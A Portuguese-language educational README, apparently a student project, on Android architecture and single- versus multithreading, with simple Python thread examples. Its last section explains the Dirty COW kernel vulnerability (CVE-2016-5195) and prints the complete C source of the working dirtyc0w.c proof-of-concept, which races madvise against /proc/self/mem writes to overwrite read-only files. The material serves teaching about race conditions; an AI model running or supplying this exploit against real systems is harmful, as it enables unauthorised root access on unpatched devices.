<h1 align="center"> Singlethread e multithreading em Android  </h1> 

## Introdução ao Android

Android é um sistema operacional _**open source**_ feito para dispositivos de baixa potência, que funcionam por meio de bateria e estão cheios de hardware. Assim como todos os sistemas operacionais, o Android permite que os aplicativos utilizem os recursos de hardware por meio da abstração e fornece um ambiente definido para os aplicativos. [Brahler 2010].

No sistema operacional Android, as aplicações são criadas em Java utilizando o Android SDK, que é um conjunto completo de ferramentas para desenvolvimento de software. Essas aplicações são executadas em uma máquina virtual Dalvik, que é responsável por interpretar o bytecode do aplicativo e executá-lo no dispositivo [Brahler 2010]. <br>

Atualmente, 69,74% dos smartphones estão usando o Android como sistema operacional, sendo assim, a plataforma que mais atrai indivíduos para a criação de aplicações. <br>

## Arquitetura do Android <br>
Segundo o [Android Developers 2012], Android é mais do que um sistema operacional. Ele e na verdade um é um software stack composto por cinco camadas, que são elas, Kernel e as ferramentas de baixo nível, as bibliotecas nativas, o Android Runtime, a camada de estrutura e, por cima de tudo, as aplicações.

<div align="center">
<img src="https://user-images.githubusercontent.com/96505484/231237056-35cb918a-5f9c-4108-bc63-8a31965021d1.png" width="700px" />
</div> 

<p align="center"> Figura 1. Arquitetura do Android </p>  

> ### Kernel Linux 

O kernel usado é o Linux na sua versão 4.14, seguida pela 4.19 e 5.4. A versão mais recente do kernel Linux disponível é a 5.12, mas ainda não foi amplamente adotada no Android. [Android Developers 2023] <br> 

> ### Android Runtime

O Android Runtime (ART) é o ambiente de execução de aplicativos usado pelo sistema operacional Android. Ele é responsável por executar o código dos aplicativos em um dispositivo Android <br>

> ### Bibliotecas
As bibliotecas são organizadas em diferentes camadas de acordo com sua finalidade e nível de abstração. As camadas de bibliotecas mais baixas são compostas de bibliotecas nativas, que são escritas em linguagens de programação de baixo nível, como C e C++, e são usadas para acessar recursos do sistema operacional e do hardware, como o sistema de arquivos, a câmera ou o GPS. As bibliotecas de nível mais alto são compostas de código Java, que são usadas para fornecer funcionalidades de alto nível, como a interface do usuário, a lógica de negócios e a comunicação com a rede. <br>

> ### Framework de Aplicação
O Framework de Aplicação é projetado para facilitar o desenvolvimento de aplicativos Android, fornecendo uma estrutura de desenvolvimento consistente e reutilizável. Ele fornece uma variedade de componentes que os desenvolvedores podem usar para criar aplicativos, incluindo Activity, Service, Broadcast Receiver e Content Provider. <br>

> ### Aplicações 
As aplicações são desenvolvidas por terceiros, incluindo empresas, desenvolvedores independentes e organizações governamentais, e são distribuídas através da Google Play Store ou outras lojas de aplicativos. As aplicações podem ser gratuitas ou pagas, e muitas delas oferecem recursos adicionais através de compras dentro do aplicativo.


## Introdução as Threads
> ### Single Thread
Uma thread é a menor unidade de processamento que pode ser agendada pelo sistema operacional para executar uma tarefa em um programa. Em outras palavras, uma thread é uma sequência de instruções de código que pode ser executada simultaneamente com outras sequências de instruções de código em um mesmo programa. <br>

Cada thread possui um registro de pilha de execução próprio, que contém informações sobre as instruções que devem ser executadas e o estado atual do processo. As threads são comumente usadas em programas que precisam executar tarefas em paralelo, ou seja, que precisam executar várias tarefas simultaneamente para aumentar a eficiência do programa ou melhorar a experiência do usuário. <br>

Segue em anexo um código realizado em Python mostrando como é uma thread em execução 
```python
import threading
import time

def minha_funcao():
    # código da thread
    print("Iniciando a thread...")
    time.sleep(10)  # faz a thread esperar por 10 segundos
    print("Finalizando a thread...")

# cria uma nova thread
thread = threading.Thread(target=minha_funcao)

# inicia a thread
thread.start()

# espera até que a thread termine antes de continuar com o código principal
thread.join()

# o programa agora pode continuar com outras tarefas
print("A thread foi finalizada.") 
```
Para analisarmos melhor o processo dessa thread, podemos usar o utilitário "htop" no linux, para exibir as informações sobre os processos em execução do sistema de uma forma mais interativa e visual 
<div align="center">
<img src="https://user-images.githubusercontent.com/96505484/231562564-fb429be1-5430-45d3-af25-24663a677b54.png" width="700px" />
<p align="center"> Figura 2. htop no Linux </p>  
</div> <br>

> ### Multithread
Multithreading refere-se à capacidade de executar múltiplos fluxos de execução ou tarefas simultaneamente em um único processo. Cada thread é uma sequência independente de instruções que podem ser executadas em paralelo com outras threads no mesmo processo. <br>

Quando uma aplicação é executada em um único thread, ela executa as tarefas em uma sequência linear, o que pode levar a atrasos e tempos de resposta lentos. Por outro lado, se a aplicação utilizar vários threads, ela pode executar várias tarefas simultaneamente, o que pode melhorar significativamente o desempenho e a capacidade de resposta da aplicação.[BURNS 2020]
```python 
import threading
import time

def contar_ate_n(n):
    for i in range(1, n+1):
        print(i)
        time.sleep(0.5)

if __name__ == '__main__':
    n1 = int(input('Digite um número inteiro para a primeira thread: '))
    n2 = int(input('Digite um número inteiro para a segunda thread: '))

    thread1 = threading.Thread(target=contar_ate_n, args=(n1,))
    thread2 = threading.Thread(target=contar_ate_n, args=(n2,))

    thread1.start()
    thread2.start()

    thread1.join()
    thread2.join()

    print('Contagem finalizada!')
```
Neste caso, podemos perceber como o multithread funciona, sendo executado mais de uma thread ao mesmo tempo.
<div align="center">
<img src="https://user-images.githubusercontent.com/96505484/231831208-375ee1ba-f361-4421-b9c9-fc3ae457b0db.png" width="700px" />
<p align="center"> Figura 3. htop com multithread </p>  
</div> <br>

## Multithread em Android
A partir de uma perspectiva de aplicação, existem três tipos de threads: threads de UI, threads de Binder e threads de background, embora todas as threads de aplicação sejam baseadas nos pthreads nativos do Linux e tenham uma representação de Thread em Java, a plataforma atribui propriedades especiais a elas que as distinguem umas das outras.[Göransson 2014]

>### UI Thread
A UI thread (também conhecida como thread da interface do usuário) em um aplicativo Android é a thread principal responsável por lidar com a interface do usuário e a interação do usuário com o aplicativo. Essa thread é responsável por executar todas as operações da interface do usuário, como atualizações de tela, eventos de toque e interações de entrada.[Göransson 2014] <br>

>### Binder Threads
A Binder é um mecanismo de comunicação interprocessos (IPC) utilizado no sistema operacional Android para permitir que processos separados possam se comunicar uns com os outros. Cada processo do Android tem sua própria thread Binder, que é responsável por receber solicitações de IPC e despachá-las para o processo correto.[Göransson 2014] <br>

>### Background Threads
As background threads são threads separadas da UI thread de um aplicativo Android que são utilizadas para executar tarefas que não devem ser executadas na UI thread, como operações de rede, acesso a banco de dados, cálculos complexos e outras tarefas que podem levar muito tempo para serem concluídas.[Göransson 2014] <br>

## CVE-2016-5195 - Dirty COW
O Dirty COW (acrônimo de "Dirty Copy-On-Write") é uma vulnerabilidade de segurança de escalonamento de privilégios que afetou o kernel do Linux e, portanto, também afetou o sistema operacional Android.

O Dirty COW explora uma falha na implementação do mecanismo de proteção Copy-On-Write (COW) no kernel do Linux. O mecanismo de COW é utilizado para evitar a cópia desnecessária de páginas de memória em sistemas que utilizam fork() para criar novos processos. Quando um processo filho é criado por meio do fork(), ele compartilha as mesmas páginas de memória do processo pai até que uma delas seja modificada, momento em que uma cópia separada da página é criada para o processo filho.

A falha do Dirty COW permitiu que um atacante local conseguisse modificar páginas de memória protegidas pelo mecanismo de COW sem a necessidade de privilégios de root, o que poderia permitir a um atacante local obter acesso de root ao sistema operacional Android.

O exploit do Dirty COW era relativamente simples de ser executado e, portanto, representou um risco significativo de segurança para muitos dispositivos Android. A Google lançou uma atualização de segurança para corrigir essa vulnerabilidade em outubro de 2016. <br>


```c
/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;
 
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```
## Referências
Android Developers (2012). The developer’s guide. Disponível em: <http://developer.android.com/guide/index.html>.<br>

Brahler, S. (2010). Analysis of the android architecture.<br>

Göransson, Anders. Efficient Android Threading.<br>

https://book-of-gehn.github.io/articles/2021/08/22/Rooting-Android-with-a-Dirty-COW.html<br>















